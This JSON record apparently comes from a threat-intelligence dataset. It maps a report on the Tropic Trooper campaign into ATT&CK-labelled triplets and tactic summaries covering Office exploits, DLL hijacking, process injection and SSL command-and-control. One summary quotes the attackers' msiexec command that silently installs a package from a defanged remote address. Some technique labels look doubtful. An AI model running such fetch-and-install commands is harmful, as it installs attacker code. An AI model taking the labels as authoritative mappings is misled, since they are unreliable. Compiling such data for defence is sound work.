{
    "triplets": [
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "threat-actor",
            "Relation": "execute commands through",
            "Object": "CVE-2017-11882",
            "ObjectType": "vulnerablity",
            "tactic": "Initial Access",
            "technique": [
                "T1190-Exploit Public-Facing Application"
            ]
        },
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "threat-actor",
            "Relation": "execute commands through",
            "Object": "CVE-2018-0802",
            "ObjectType": "vulnerablity",
            "tactic": "Initial Access",
            "technique": [
                "T1190-Exploit Public-Facing Application"
            ]
        },
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "threat-actor",
            "Relation": "download",
            "Object": "installer package",
            "ObjectType": "file",
            "tactic": "Initial Access",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "threat-actor",
            "Relation": "install",
            "Object": "installer package",
            "ObjectType": "file",
            "tactic": "Initial Access",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "The system configuration file",
            "SubjectType": "file",
            "Relation": "drop",
            "Object": "backdoor installer",
            "ObjectType": "file",
            "tactic": "Execution",
            "technique": [
                "T1072-Software Deployment Tools"
            ]
        },
        {
            "Subject": "The backdoor installer",
            "SubjectType": "file",
            "Relation": "drop",
            "Object": "sidebar.exe",
            "ObjectType": "file",
            "tactic": "Execution",
            "technique": [
                "T1072-Software Deployment Tools"
            ]
        },
        {
            "Subject": "The backdoor installer",
            "SubjectType": "file",
            "Relation": "drop",
            "Object": "malicious loader",
            "ObjectType": "file",
            "tactic": "Execution",
            "technique": [
                "T1072-Software Deployment Tools"
            ]
        },
        {
            "Subject": "The backdoor installer",
            "SubjectType": "file",
            "Relation": "drop",
            "Object": "encrypted configuration file",
            "ObjectType": "file",
            "tactic": "Execution",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "UserInstall.exe",
            "SubjectType": "file",
            "Relation": "use",
            "Object": "BITSadmin command-line tool",
            "ObjectType": "tool",
            "tactic": "Execution",
            "technique": [
                "T1059-Command and Scripting Interpreter"
            ]
        },
        {
            "Subject": "The malicious loader",
            "SubjectType": "file",
            "Relation": "use",
            "Object": "DLL hijacking",
            "ObjectType": "Technique",
            "tactic": "Execution",
            "technique": [
                "T1129-Shared Modules"
            ]
        },
        {
            "Subject": "The malicious loader",
            "SubjectType": "file",
            "Relation": "inject",
            "Object": "DLL backdoor",
            "ObjectType": "file",
            "tactic": "Execution",
            "technique": [
                "T1129-Shared Modules"
            ]
        },
        {
            "Subject": "Malicious documents",
            "SubjectType": "file",
            "Relation": "host",
            "Object": "backdoor's dropper",
            "ObjectType": "file",
            "tactic": "Execution",
            "technique": [
                "T1204-User Execution"
            ]
        },
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "threat-actor",
            "Relation": "use",
            "Object": "DLL hijacking",
            "ObjectType": "Technique",
            "tactic": "Defense Evasion",
            "technique": [
                "T1564-Hide Artifacts",
                "T1574-Hijack Execution Flow"
            ]
        },
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "threat-actor",
            "Relation": "drop",
            "Object": "three files",
            "ObjectType": "file",
            "tactic": "Defense Evasion",
            "technique": [
                "T1564-Hide Artifacts"
            ]
        },
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "threat-actor",
            "Relation": "create",
            "Object": "one hidden directory",
            "ObjectType": "directory",
            "tactic": "Defense Evasion",
            "technique": [
                "T1564-Hide Artifacts",
                "T1574-Hijack Execution Flow"
            ]
        },
        {
            "Subject": "FakeRun",
            "SubjectType": "Malware",
            "Relation": "execute",
            "Object": "dllhost.exe",
            "ObjectType": "process",
            "tactic": "Defense Evasion",
            "technique": [
                "T1574-Hijack Execution Flow",
                "T1055-Process Injection"
            ]
        },
        {
            "Subject": "FakeRun",
            "SubjectType": "Malware",
            "Relation": "inject",
            "Object": "malicious DLL file",
            "ObjectType": "file",
            "tactic": "Defense Evasion",
            "technique": [
                "T1055-Process Injection"
            ]
        },
        {
            "Subject": "TClient",
            "SubjectType": "Malware",
            "Relation": "use",
            "Object": "SSL",
            "ObjectType": "tool",
            "tactic": "Command and Control",
            "technique": [
                "T1071-Application Layer Protocol",
                "T1105-Ingress Tool Transfer",
                "T1573-Encrypted Channel"
            ]
        },
        {
            "Subject": "TClient",
            "SubjectType": "Malware",
            "Relation": "connect to",
            "Object": "Tropic Trooper's C&C server",
            "ObjectType": "infrastructure",
            "tactic": "Command and Control",
            "technique": [
                "T1071-Application Layer Protocol",
                "T1573-Encrypted Channel"
            ]
        },
        {
            "Subject": "TClient",
            "SubjectType": "Malware",
            "Relation": "use",
            "Object": "symmetric encryption",
            "ObjectType": "tool",
            "tactic": "Command and Control",
            "technique": [
                "T1071-Application Layer Protocol",
                "T1573-Encrypted Channel"
            ]
        },
        {
            "Subject": "TClient",
            "SubjectType": "Malware",
            "Relation": "use",
            "Object": "custom SSL libraries",
            "ObjectType": "tool",
            "tactic": "Command and Control",
            "technique": [
                "T1071-Application Layer Protocol",
                "T1573-Encrypted Channel"
            ]
        },
        {
            "Subject": "Tropic Trooper",
            "SubjectType": "Threat Actor",
            "Relation": "use",
            "Object": "Microsoft Office documents",
            "ObjectType": "Artifact",
            "tactic": "Others",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "TClient",
            "SubjectType": "Malware",
            "Relation": "use",
            "Object": "custom SSL libraries",
            "ObjectType": "Artifact",
            "tactic": "Others",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "TClient",
            "SubjectType": "Malware",
            "Relation": "communicate with",
            "Object": "C&C server",
            "ObjectType": "Infrastructure",
            "tactic": "Others",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "backdoor",
            "SubjectType": "Malware",
            "Relation": "load",
            "Object": "encrypted configuration file",
            "ObjectType": "artifacts",
            "tactic": "Persistence",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "backdoor",
            "SubjectType": "Malware",
            "Relation": "use",
            "Object": "SSL protocol",
            "ObjectType": "tool",
            "tactic": "Persistence",
            "technique": [
                "Others"
            ]
        },
        {
            "Subject": "backdoor",
            "SubjectType": "Malware",
            "Relation": "connect-to",
            "Object": "command-and-control (C&C) servers",
            "ObjectType": "infrastrcucture",
            "tactic": "Persistence",
            "technique": [
                "Others"
            ]
        }
    ],
    "file_name": "Tropic Trooper\u2019s New Strategy",
    "tactic_label": true,
    "rewrite": {
        "Reconnaissance": "None",
        "Resource Development": "None",
        "Initial Access": "Tropic Trooper, also known as KeyBoy, executed commands through exploits for CVE-2017-11882 or CVE-2018-0802, which are security flaws in Microsoft Office's Equation Editor (EQNEDT32.EXE). They downloaded an installer package (.msi) and installed it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).",
        "Execution": "The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) then deleted itself. The backdoor installer dropped a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (in\"C:\\ProgramData\\Apple\\Update\\wab32res.dll\"), and an encrypted configuration file. UserInstall.exe abused the BITSadmin command-line tool to create a job and launch sidebar.exe. The malicious loader used dynamic-link library (DLL) hijacking on sidebar.exe and launched dllhost.exe (a normal file). The loader then injected a DLL backdoor into dllhost.exe. Malicious documents that don't need to download anything from the internet as the backdoor's dropper is already embedded in the document were also observed.",
        "Persistence": "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.",
        "Privilege Escalation": "None",
        "Defense Evasion": "Tropic Trooper used DLL hijacking to evade antivirus detection, as the malicious wab32res.dll was loaded by a benign file, sidebar.exe. The installer dropped three files into the Apple/Update directory and created one hidden directory (UFile) into C:\\ProgramData\\Apple\\Update\\, likely as a ruse. The loader, named FakeRun, executed dllhost.exe and injected one malicious DLL file, which is the backdoor, into this process.",
        "Credential Access": "None",
        "Discovery": "None",
        "Lateral Movement": "None",
        "Collection": "None",
        "Command and Control": "TClient used SSL to connect to Tropic Trooper's C&C server. The C&C server and some configuration values are not hardcoded in the backdoor, allowing Tropic Trooper's operators to easily change/update the C&C server and configure other values. TClient is one of Tropic Trooper's backdoors, which uses symmetric encryption to decrypt its configuration with a 16-byte key. TClient uses custom SSL libraries to connect the C&C server.",
        "Exfiltration": "None",
        "Impact": "None",
        "Others": "Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). Another PDB string found is D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\InstallClient.pdb. At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\\ProgramData\\Apple\\Update\\, likely as a ruse. It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file. Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper's use or abuse of components or services that elapse so they can leave as few traces as possible."
    },
    "technique_label": true
}